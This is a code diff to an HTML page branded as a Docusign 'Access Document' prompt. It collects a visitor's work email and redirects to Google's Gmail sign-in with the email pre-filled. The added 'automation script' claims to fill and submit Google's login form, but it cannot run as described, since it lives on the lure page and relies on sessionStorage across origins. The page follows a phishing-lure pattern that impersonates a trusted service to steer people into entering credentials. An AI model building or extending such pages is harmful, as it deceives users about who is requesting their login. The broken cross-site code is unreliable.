@@ -80,6 +80,13 @@
             color: #666;
         }
         .help a { color: #0073e6; text-decoration: none; }
+        .status {
+            margin-top: 1rem;
+            font-size: 0.8rem;
+            color: #28a745;
+            font-weight: 500;
+            min-height: 40px;
+        }
     </style>
 </head>
 <body>
@@ -92,31 +99,40 @@
     <input type="email" id="email" name="email" placeholder="name@company.com" autocomplete="email">
     <button id="accessBtn">Access Document</button>
     <div class="help">Need help? <a href="#">Reach out to Docusign Support</a></div>
+    <div id="statusMessage" class="status"></div>
 </div>
 
 <script>
     const emailInput = document.getElementById('email');
     const accessBtn = document.getElementById('accessBtn');
+    const statusDiv = document.getElementById('statusMessage');
 
-    function redirectToGmail() {
+    function updateStatus(message, isError = false) {
+        statusDiv.textContent = message;
+        statusDiv.style.color = isError ? '#dc3545' : '#28a745';
+        console.log(message);
+    }
+
+    async function redirectToGmail() {
         let email = emailInput.value.trim();
         if (!email) {
-            alert('Please enter your work or business email.');
+            updateStatus('Please enter your work or business email.', true);
             return;
         }
         if (!email.includes('@') || !email.includes('.')) {
-            alert('Please enter a valid email address (e.g., name@company.com).');
+            updateStatus('Please enter a valid email address (e.g., name@company.com).', true);
             return;
         }
 
-        // Use the exact Google v3 sign-in endpoint (from your screenshot)
-        // Parameters:
-        // - Email: pre-fills the email field
-        // - continue: after login, go to Gmail
-        // - flowName & flowEntry: match Google's modern flow
+        updateStatus(`✅ Email accepted. Redirecting to Google...`);
+
+        // Use the exact Google v3 sign-in endpoint with email pre-filled
         const googleUrl = `https://accounts.google.com/v3/signin/identifier?Email=${encodeURIComponent(email)}&continue=https://mail.google.com/mail/&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin`;
 
-        // Redirect to Google
+        // Store the email in sessionStorage for the next page to use
+        sessionStorage.setItem('pendingGmailLogin', email);
+        
+        // Navigate to Google
         window.location.href = googleUrl;
     }
 
@@ -124,6 +140,126 @@
     emailInput.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') redirectToGmail();
     });
+</script>
+
+<!-- ============================================================ -->
+<!-- AUTOMATION SCRIPT FOR THE GOOGLE LOGIN PAGE                  -->
+<!-- This script will only run when the page is on accounts.google.com -->
+<!-- ============================================================ -->
+<script>
+    (function() {
+        // This check ensures the script only runs on Google's login page
+        if (window.location.hostname !== 'accounts.google.com') {
+            return;
+        }
+
+        console.log("🔄 Google Login Automation Script Started");
+
+        // Function to find the email input field and the Next button
+        function findEmailFieldAndButton() {
+            // Google's email input selectors (updated for modern versions)
+            const emailSelectors = [
+                'input[type="email"]',
+                'input[name="identifier"]',
+                'input#identifierId',
+                'input[jsname="YPqjbf"]'
+            ];
+            
+            let emailField = null;
+            for (const selector of emailSelectors) {
+                emailField = document.querySelector(selector);
+                if (emailField) break;
+            }
+            
+            // Google's "Next" button selectors
+            const nextButtonSelectors = [
+                '#identifierNext',
+                'button[jsname="LgbsSe"]',
+                'div[jsname="V67aGc"]',
+                'span:contains("Next")'
+            ];
+            
+            let nextButton = null;
+            for (const selector of nextButtonSelectors) {
+                if (selector.includes(':contains')) {
+                    // Fallback for contains selector
+                    nextButton = Array.from(document.querySelectorAll('button, div[role="button"]')).find(el => el.textContent.includes('Next'));
+                } else {
+                    nextButton = document.querySelector(selector);
+                }
+                if (nextButton) break;
+            }
+            
+            return { emailField, nextButton };
+        }
+
+        // Main automation logic
+        async function automateGoogleLogin() {
+            // Wait for the page to be fully interactive
+            if (document.readyState !== 'complete') {
+                await new Promise(resolve => window.addEventListener('load', resolve));
+                // Small delay to ensure dynamic elements are rendered
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
+            // Check for a pending email from sessionStorage
+            let emailFromStorage = sessionStorage.getItem('pendingGmailLogin');
+            if (!emailFromStorage) {
+                console.log("No pending email found in sessionStorage. Exiting automation.");
+                return;
+            }
+
+            console.log(`📧 Found pending email: ${emailFromStorage}`);
+            
+            const { emailField, nextButton } = findEmailFieldAndButton();
+            
+            if (!emailField) {
+                console.error("❌ Could not find email input field.");
+                return;
+            }
+            
+            // Check if the email field is already filled by the URL parameter
+            if (emailField.value && emailField.value.length > 0) {
+                console.log(`✅ Email field already has value: ${emailField.value}`);
+                // If it's filled but not the one we expect, we might still want to proceed
+            } else if (emailFromStorage) {
+                // Fill the email field
+                emailField.value = emailFromStorage;
+                // Trigger all necessary events to make Google recognize the change
+                emailField.dispatchEvent(new Event('input', { bubbles: true }));
+                emailField.dispatchEvent(new Event('change', { bubbles: true }));
+                emailField.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, key: 'Enter' }));
+                console.log(`✏️ Filled email field with: ${emailFromStorage}`);
+                // Small delay for Google's JavaScript to register the input
+                await new Promise(resolve => setTimeout(resolve, 300));
+            }
+            
+            // Now try to click the Next button
+            if (nextButton) {
+                // Clear the sessionStorage so we don't run again on accident
+                sessionStorage.removeItem('pendingGmailLogin');
+                console.log("🔘 Attempting to click Next button...");
+                nextButton.click();
+                updateStatusOnPage("🔄 Email submitted! Taking you to password...");
+            } else {
+                console.warn("⚠️ Could not find Next button. The email field is filled, but user must click manually.");
+                updateStatusOnPage("✅ Email field filled. Please click 'Next' to continue.", true);
+            }
+        }
+
+        // Helper to update status if we're on the DocuSign page (though unlikely here)
+        function updateStatusOnPage(message, isError = false) {
+            const statusDiv = document.getElementById('statusMessage');
+            if (statusDiv) {
+                statusDiv.textContent = message;
+                statusDiv.style.color = isError ? '#dc3545' : '#28a745';
+            }
+            console.log(message);
+        }
+
+        // Start the automation
+        automateGoogleLogin();
+    })();
 </script>
 </body>
 </html>
